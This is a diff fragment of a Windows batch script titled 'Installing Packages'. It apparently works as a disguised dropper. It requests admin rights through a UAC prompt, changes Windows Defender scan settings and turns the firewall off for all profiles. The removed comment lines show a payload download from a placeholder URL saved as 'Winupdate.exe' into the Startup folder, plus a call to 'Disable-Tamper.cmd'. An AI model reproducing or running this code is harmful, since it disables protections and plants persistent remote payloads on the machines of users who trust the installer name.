@@ -3,10 +3,10 @@
 title Installing Packages 
 :: BatchGotAdmin
 ::-----------------------------------------
-REM  --> CheckING for permissions
+
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 
-REM --> If error flag set, we do not have admin.
+
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
@@ -79,11 +79,6 @@ powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
 
 powershell.exe -command "netsh advfirewall set allprofiles state off"
 
-REM cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-
-REM powershell -command "start-bitstransfer https://direct-url-for-payload/xxx.exe   .\Winupdate.exe"
-
-REM start  Winupdate.exe & cd %temp% & Disable-Tamper.cmd
 
 
 mkdir %USERPROFILE%\AppData\Roaming\System_logs
